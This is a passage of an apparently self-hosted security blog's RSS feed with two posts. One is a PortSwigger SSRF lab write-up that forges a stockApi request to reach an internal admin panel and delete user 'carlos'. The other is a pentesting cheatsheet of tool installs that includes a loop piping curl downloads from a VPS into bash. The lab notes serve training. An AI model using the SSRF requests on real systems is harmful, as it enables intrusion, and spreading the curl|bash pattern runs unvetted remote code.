    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://192.168.0.68/admin&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The same example as previous, but for remote API:&lt;/p&gt;
&lt;p&gt;a Webapplication makes a request for stock check at &lt;code&gt;http://192.168.0.1:8080/product/stock/check?productId=1&amp;amp;storeId=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;we know that API is in this range &lt;code&gt;http://192.168.0.X:8080&lt;/code&gt;&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;1c2---ssrf-against-external-back-end-system-portswigger-lab&#34;&gt;
  1c2 - SSRF against external back-end system [PortSwigger Lab]
  &lt;a href=&#34;#1c2---ssrf-against-external-back-end-system-portswigger-lab&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;p&gt;The same principle applies for remote SSRF. An attacker can submit the following request to access the admin interface&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118

stockApi=http://192.168.0.68/admin&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The same example as previous, but for remote API:&lt;/p&gt;
&lt;p&gt;a Webapplication makes a request for stock check at &lt;code&gt;http://192.168.0.1:8080/product/stock/check?productId=1&amp;amp;storeId=1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;we know that API is in this range &lt;code&gt;http://192.168.0.X:8080&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;so to find it we use BurpSuite Intruder&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;make payloads 1-254&lt;/li&gt;
&lt;li&gt;run Start Attack&lt;/li&gt;
&lt;li&gt;wait for status code 200&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http://192.168.0.30:8080/admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;change request header upon clicking &lt;em&gt;Check Stock&lt;/em&gt; to &lt;code&gt;stockApi=http://192.168.0.30/admin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;admin panel opens up&lt;/li&gt;
&lt;li&gt;make request again &lt;code&gt;stockApi=http://192.168.0.30/admin/delete?username=carlos&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;send&lt;/li&gt;
&lt;li&gt;done&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    <item>
      <title></title>
      <link>http://localhost:1313/archive/useful-cheatsheet-for-pentesting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/useful-cheatsheet-for-pentesting/</guid>
      <description>&lt;h1 id=&#34;0c---useful-cheatsheet-for-pentesting&#34;&gt;
  0c - Useful cheatsheet for pentesting
  &lt;a href=&#34;#0c---useful-cheatsheet-for-pentesting&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Tools are only as effective as their operator is knowledgeable.&lt;/li&gt;
&lt;li&gt;Have ready to use virtual machines of GNU/Linux and Windows alike.&lt;/li&gt;
&lt;li&gt;Use password managers and use strong passwords, preferably&lt;/li&gt;
&lt;li&gt;keep pentesting and personal workspaces separate&lt;/li&gt;
&lt;li&gt;document everything and have legal confirmations before doing any target assessment&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;full-upgrade--update-of-the-system&#34;&gt;
  Full upgrade &amp;amp; update of the system
  &lt;a href=&#34;#full-upgrade--update-of-the-system&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update -y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt full-upgrade -y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt autoremove -y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt autoclean -y&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;installing-multiple-packages-at-once&#34;&gt;
  Installing multiple packages at once
  &lt;a href=&#34;#installing-multiple-packages-at-once&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $ cat install.list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netcat
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;radare2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;seclists
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wireshark
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gobuster&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat install.list | tr &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; -y&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;running-multiple-bash-configurations-at-once-on-the-system&#34;&gt;
  Running multiple &lt;code&gt;bash&lt;/code&gt; configurations at once on the system
  &lt;a href=&#34;#running-multiple-bash-configurations-at-once-on-the-system&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@user:~$ cat automation_scripts.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;terminal.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tools.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUI.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;network.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; script in &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat customization-scripts.txt&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; curl -s http://myvps.vps-provider.net/$script | bash; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;example-penetration-testing-project-folder-structure-might-look-like-the-following&#34;&gt;
  Example penetration testing project folder structure might look like the following
  &lt;a href=&#34;#example-penetration-testing-project-folder-structure-might-look-like-the-following&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;george@LTP51&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/PEN1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ tree .
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Penetration-Testing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 Pre-Engagement
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Network-Pentesting
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        Linux
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	           Information-Gathering
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			       ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	           Vulnerability-Assessment
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              	 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;           	 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               	 ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		 Windows
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     		    Information-Gathering
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		       ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    		    ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     WebApp-Pentesting
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Social-Engineering
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     .......
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Reporting
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 Results
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	     ...&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;general-categories-for-note-taking-during-target-assessment&#34;&gt;
  General categories for note-taking during target assessment
  &lt;a href=&#34;#general-categories-for-note-taking-during-target-assessment&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Newly discovered information&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;Take note of every newly discovered vulnerabilities, targets or points of access, IP addresses, usernames, passwords, source code, etc. that you identified and are related to the penetration testing engagement and process.&lt;/p&gt;</description>
      <content>
&lt;h1 id=&#34;0c---useful-cheatsheet-for-pentesting&#34;&gt;
  0c - Useful cheatsheet for pentesting
  &lt;a href=&#34;#0c---useful-cheatsheet-for-pentesting&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Tools are only as effective as their operator is knowledgeable.&lt;/li&gt;
&lt;li&gt;Have ready to use virtual machines of GNU/Linux and Windows alike.&lt;/li&gt;
&lt;li&gt;Use password managers and use strong passwords, preferably&lt;/li&gt;
&lt;li&gt;keep pentesting and personal workspaces separate&lt;/li&gt;
&lt;li&gt;document everything and have legal confirmations before doing any target assessment&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;full-upgrade--update-of-the-system&#34;&gt;
  Full upgrade &amp;amp; update of the system
  &lt;a href=&#34;#full-upgrade--update-of-the-system&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update -y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt full-upgrade -y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt autoremove -y &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt autoclean -y&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;installing-multiple-packages-at-once&#34;&gt;
  Installing multiple packages at once
  &lt;a href=&#34;#installing-multiple-packages-at-once&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; $ cat install.list
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;netcat
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;radare2
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;seclists
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcpdump
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wireshark
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;gobuster&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat install.list | tr &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\n&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt; -y&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;running-multiple-bash-configurations-at-once-on-the-system&#34;&gt;
  Running multiple &lt;code&gt;bash&lt;/code&gt; configurations at once on the system
  &lt;a href=&#34;#running-multiple-bash-configurations-at-once-on-the-system&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@user:~$ cat automation_scripts.txt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;terminal.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tools.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUI.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;network.sh
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; script in &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat customization-scripts.txt&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; curl -s http://myvps.vps-provider.net/$script | bash; &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&#34;example-penetration-testing-project-folder-structure-might-look-like-the-following&#34;&gt;
  Example penetration testing project folder structure might look like the following
  &lt;a href=&#34;#example-penetration-testing-project-folder-structure-might-look-like-the-following&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;bash&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;george@LTP51&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/PEN1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ tree .
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Penetration-Testing
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	 Pre-Engagement
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        ...
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;     Network-Pentesting
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	        Linux
